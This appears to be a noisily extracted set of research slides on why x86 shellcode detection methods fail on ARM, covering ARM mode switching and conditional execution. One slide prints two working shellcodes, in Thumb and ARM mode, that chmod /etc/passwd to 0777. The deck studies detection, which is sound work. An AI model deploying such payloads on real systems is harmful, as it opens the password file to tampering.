Shellcodes   
for  ARM:  
Your  Pills  Don’t 
Work  on  Me,  x86 
Svetlana Gaivoronski  @SadieSv 
Ivan Petrov                  @_IvanPetrov_ 
Why  it’s  important 	
q 	
  Increasing	
  number	
  of	
  ARM-­‐based	
  devices	
q 	
  Signiﬁcant	
  number	
  of	
  vulnerable	
  so:ware	
  and	
  huge	
  base	
  of	
  reusable	
  code	
q 	
  Memory	
  corrup?on	
  errors	
  are	
  s?ll	
  there	
@SadieSv	
  @_IvanPetrov_	
Is  it  decidable? 
Ac?vator	
• NOP	
• GetPC	
Decryptor	
Payload	
Return	
  address	
  zone	
q 	
  Structure	
  limita?ons	
q 	
  Size	
  limita?ons	
@SadieSv	
  @_IvanPetrov_	
May  be  it’s  not  that  bad? 
q 	
  Stack	
  canaries:	
  calculates	
  pseudo-­‐random	
number	
  and	
  saves	
  it	
  to	
  the	
  stack;	
q 	
  SafeSEH:	
  instead	
  of	
  protecDng	
  stack	
  protects	
excepDon	
  handlers	
  ;	
q 	
  DEP:	
  makes	
  stack/part	
  of	
  stack	
  non-­‐
executable;	
q 	
  ASLR:	
  randomizes	
  he	
  base	
  address	
  of	
executables,	
  stack	
  and	
  heap	
  in	
  a	
  process’s	
adress	
  space	
  .	
BYPASSED 
@SadieSv	
  @_IvanPetrov_	
Okay,  what’s  the  ARM  problem? 
q 	
  Shellcodes	
  are	
  already	
there	
q 	
  Shellcode	
  detec?ons	
methods	
  (okay,	
  “smarter”	
than	
  signature-­‐based)	
  are	
not…	
Are  x86-based  methods are  
applicable   here? 
For analysis of appicapability  
of  х86–based techniques for  ARM it’s 
reasonable to understand differences of 
two platforms. 
@SadieSv	
  @_IvanPetrov_	
Main  differences  of  two 
platforms: 
q Commands	
  size	
  is	
  ﬁxed;	
q 2	
  diﬀerent	
  CPU	
  modes	
  (32bit	
  and	
  16bit)and	
  possibility	
  to	
dynamic	
  switching	
  between	
  them; 
q Possibility	
  of	
  condiDonal	
  instrucDon	
  execuDon; 
q Possibility	
  of	
  direct	
  access	
  to	
  PC; 
q load-­‐store	
  architecture	
  (not	
  possible	
  to	
  access	
  memory	
directly	
  from	
  arithmeDc	
  instrucDons); 
q FuncDon	
  arguments	
  (and	
  return	
  address	
  as	
  well)	
  go	
  to	
registers,	
  not	
  stack. 
@SadieSv	
  @_IvanPetrov_	
i	
  f	
  (	
  e	
  r	
  r	
  !=	
  0)	
  p	
  r	
  i	
  n	
  t	
  f	
  (	
  "	
  Er	
  r	
  o	
  r	
  c	
  o	
  d	
  e	
  =	
  %i	
  \	
  n	
  "	
  ,	
  e	
  r	
  r	
  )	
  ;	
e	
  l	
  s	
  e	
  p	
  r	
  i	
  n	
  t	
  f	
  (	
  "OK!	
  \	
  n	
  "	
  )	
  ;	
  CMP	
  r1	
  ,	
  #0	
  BEQ	
  .	
  L4	
  LDR	
  r0	
  ,	
  BL	
  prin]	
  B	
  .	
  L8	
.	
  L4	
  :	
  LDR	
  r0	
  ,	
  BL	
  prin]	
.	
  L8	
  :	
CMP	
  r1	
  ,	
  #0	
LDRNE	
  r0	
  ,	
LDREQ	
  r0	
  ,	
BL	
  prin]	
Without	
  condi?onal	
instruc?ons	
With	
  condi?onal	
instruc?ons	
Condi?onal	
  execu?on	
@SadieSv	
  @_IvanPetrov_	
Thumb	
  CPU  mode	
chmod("/etc/passwd",	
  0777)	
  -­‐	
  31	
  byte	
"\x78\x46"	
  //	
  mov	
  r0,	
  pc
"\x10\x30"	
  //	
  adds	
  r0,	
  #16
"\xﬀ\x21"	
  //	
  movs	
  r1,	
  #255	
  ;	
  0xﬀ	
"\xﬀ\x31"	
  //	
  adds	
  r1,	
  #255	
  ;	
  0xﬀ 	
"\x01\x31"	
  //	
  adds	
  r1,	
  #1
"\x0f\x37"	
  //	
  adds	
  r7,	
  #15
"\x01\xdf"	
  //	
  svc	
  1
  ;	
  chmod(..)	
"\x40\x40"	
  //	
  eors	
  r0,	
  r0	
"\x01\x27"	
  //	
  movs	
  r7,	
  #1
"\x01\xdf"	
  //	
  svc	
  1
  ;	
  exit(0)	
"\x2f\x65\x74\x63"	
"\x2f\x70\x61\x73"	
"\x73\x77"	
"\x64”	
chmod("/etc/passwd",	
  0777)	
  -­‐	
  51	
  byte	
"\x0f\x00\xa0\xe1"	
  //	
  mov
  r0,	
  pc	
"\x20\x00\x90\xe2"	
  //	
  adds
  r0,	
  r0,	
  #32	
"\xﬀ\x10\xb0\xe3"	
  //	
  movs
  r1,	
  #255
  ;	
  0xﬀ	
"\xﬀ\x10\x91\xe2"	
  //	
  adds
  r1,	
  r1,	
  #255	
  ;	
  0xﬀ	
"\x01\x10\x91\xe2"	
  //	
  adds
  r1,	
  r1,	
  #1	
"\x0f\x70\x97\xe2"	
  //	
  adds
  r7,	
  r7,	
  #15	
"\x01\x00\x00\xef"	
  //	
  svc
  1	
"\x00\x00\x30\xe0"	
  //	
  eors
  r0,	
  r0,	
  r0	
"\x01\x70\xb0\xe3"	
  //	
  movs
  r7,	
  #1	
"\x01\x00\x00\xef"	
  //	
  svc
  1	
"\x2f\x65\x74\x63"	
"\x2f\x70\x61\x73"	
"\x73\x77"	
"\x64"	
Thumb	
  mode	
ARM	
  mode	
@SadieSv	
  @_IvanPetrov_	
Local  recap 
Sta?c	
  analysis	
Dynamic	
  analysis	
@SadieSv	
  @_IvanPetrov_	
What  cause  such  problems 
(mostly) 
New	
  obfusca?on	
  techniques:	
1.	
  CondiDonal	
  execuDon;	
2.	
  AddiDonal	
  CPU	
  mode.	
@SadieSv	
  @_IvanPetrov_	
The  next  step? 
q We	
  already	
  have	
  (sDll	
  on-­‐going)	
  work	
  on	
  x86	
  shellcodes	
  detecDon:	
  –	
  Set	
  of	
  features	
q Are	
  they	
  features	
  of	